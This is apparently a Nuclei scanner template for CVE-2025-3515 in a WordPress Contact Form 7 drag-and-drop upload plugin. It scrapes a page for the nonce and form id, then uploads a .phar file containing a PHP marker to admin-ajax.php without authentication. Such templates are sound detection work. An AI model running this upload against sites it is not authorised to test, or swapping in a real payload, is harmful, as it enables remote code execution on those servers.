id: CVE-2025-3515

info:
  name: WordPress CF7 Drag & Drop Upload <= 1.3.8.9 - Unauth .phar Upload
  author: Trex
  severity: high
  description: |
    Drag and Drop Multiple File Upload for Contact Form 7 <= 1.3.8.9 allows
    unauthenticated .phar file upload leading to RCE in Apache+mod_php.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-3515
  classification:
    cvss-score: 8.1
    cve-id: CVE-2025-3515
    cwe-id: CWE-434
  metadata:
    max-request: 2
  tags: cve,cve2025,wordpress,fileupload,rce,phar,unauth

variables:
  page_path: "/"

http:
  - raw:
      - |
        GET {{page_path}} HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----n{{randstr}}

        ------n{{randstr}}
        Content-Disposition: form-data; name="action"

        dnd_codedropz_upload
        ------n{{randstr}}
        Content-Disposition: form-data; name="security"

        {{nonce}}
        ------n{{randstr}}
        Content-Disposition: form-data; name="id"

        {{field_id}}
        ------n{{randstr}}
        Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.phar"
        Content-Type: application/octet-stream

        <?=md5('{{randstr}}')?>
        ------n{{randstr}}--

    extractors:
      - type: regex
        name: nonce
        internal: true
        part: body_1
        group: 1
        regex:
          - '"nonce":"([a-f0-9]+)"'
          - '"ajax_nonce":"([a-f0-9]+)"'

      - type: regex
        name: field_id
        internal: true
        part: body_1
        group: 1
        regex:
          - 'data-id="(\d+)"'
          - 'wpcf7-f(\d+)-'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body_2
        words:
          - '"success":true'

      - type: regex
        part: body_2
        regex:
          - '/[^"]*{{randstr}}\.phar'